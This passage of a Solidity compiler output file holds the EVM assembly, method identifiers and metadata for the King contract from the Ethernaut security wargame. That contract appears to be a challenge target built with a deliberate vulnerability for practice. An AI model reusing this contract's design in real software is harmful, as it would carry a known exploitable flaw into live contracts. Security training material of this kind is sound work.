											"begin": 346,
											"end": 379,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 346,
											"end": 379,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 346,
											"end": 379,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 346,
											"end": 379,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 346,
											"end": 379,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 393,
											"end": 403,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 386,
											"end": 390,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 390,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 386,
											"end": 403,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 386,
											"end": 403,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 386,
											"end": 403,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 386,
											"end": 403,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 418,
											"end": 427,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 410,
											"end": 415,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 410,
											"end": 427,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 410,
											"end": 427,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 410,
											"end": 427,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 410,
											"end": 427,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 439,
											"end": 510,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 439,
											"end": 510,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 119,
											"end": 139,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 119,
											"end": 139,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 97,
											"end": 114,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 97,
											"end": 114,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 439,
											"end": 510,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 477,
											"end": 484,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 500,
											"end": 504,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 500,
											"end": 504,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 500,
											"end": 504,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 500,
											"end": 504,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 500,
											"end": 504,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 500,
											"end": 504,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 500,
											"end": 504,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 500,
											"end": 504,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 500,
											"end": 504,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 500,
											"end": 504,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 500,
											"end": 504,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 493,
											"end": 504,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 493,
											"end": 504,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 439,
											"end": 510,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 119,
											"end": 139,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 119,
											"end": 139,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 97,
											"end": 114,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 97,
											"end": 114,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7,
											"end": 133,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 7,
											"end": 133,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 44,
											"end": 51,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 84,
											"end": 126,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 77,
											"end": 82,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 73,
											"end": 127,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 62,
											"end": 127,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 62,
											"end": 127,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 139,
											"end": 235,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 176,
											"end": 183,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 205,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 223,
											"end": 228,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 205,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 205,
											"end": 229,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 205,
											"end": 229,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 205,
											"end": 229,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 194,
											"end": 229,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 194,
											"end": 229,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "tag",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 241,
											"end": 359,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 346,
											"end": 351,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 328,
											"end": 352,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 328,
											"end": 352,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 323,
											"end": 326,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 316,
											"end": 353,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 365,
											"end": 587,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 458,
											"end": 462,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 496,
											"end": 498,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 485,
											"end": 494,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 481,
											"end": 499,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 473,
											"end": 499,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 473,
											"end": 499,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 577,
											"end": 578,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 566,
											"end": 575,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 562,
											"end": 579,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 553,
											"end": 559,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 509,
											"end": 580,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 509,
											"end": 580,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 670,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 593,
											"end": 670,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 630,
											"end": 637,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 659,
											"end": 664,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 648,
											"end": 664,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 648,
											"end": 664,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 670,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 593,
											"end": 670,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 593,
											"end": 670,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 670,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 676,
											"end": 794,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 676,
											"end": 794,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 763,
											"end": 787,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 781,
											"end": 786,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 763,
											"end": 787,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 763,
											"end": 787,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 763,
											"end": 787,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 763,
											"end": 787,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 758,
											"end": 761,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 751,
											"end": 788,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 676,
											"end": 794,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 676,
											"end": 794,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 676,
											"end": 794,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 800,
											"end": 1022,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 800,
											"end": 1022,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 893,
											"end": 897,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 931,
											"end": 933,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 920,
											"end": 929,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 916,
											"end": 934,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 908,
											"end": 934,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 908,
											"end": 934,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 944,
											"end": 1015,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1012,
											"end": 1013,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1001,
											"end": 1010,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 997,
											"end": 1014,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 988,
											"end": 994,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 944,
											"end": 1015,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 944,
											"end": 1015,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 944,
											"end": 1015,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 944,
											"end": 1015,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 800,
											"end": 1022,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 800,
											"end": 1022,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 800,
											"end": 1022,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 800,
											"end": 1022,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 800,
											"end": 1022,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"contracts/Ethernaut/09-King.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"_king()": "29cc6d6f",
							"owner()": "8da5cb5b",
							"prize()": "e3ac5d26"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"_king\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"prize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Ethernaut/09-King.sol\":\"King\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Ethernaut/09-King.sol\":{\"keccak256\":\"0x43e2236104bd26d2cb67030e0bb73c3f29c582019ba1ab8059e14d7d761af920\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://44b61acb749ccc65c09c2931796b0346bc82b6514b6d66f37b358927d66fd4bc\",\"dweb:/ipfs/QmQiQrHPryeaNBYEcw6LJKyXz7997nFfJLxuDDWiA3Aw4i\"]}},\"version\":1}",
					"storageLayout": {
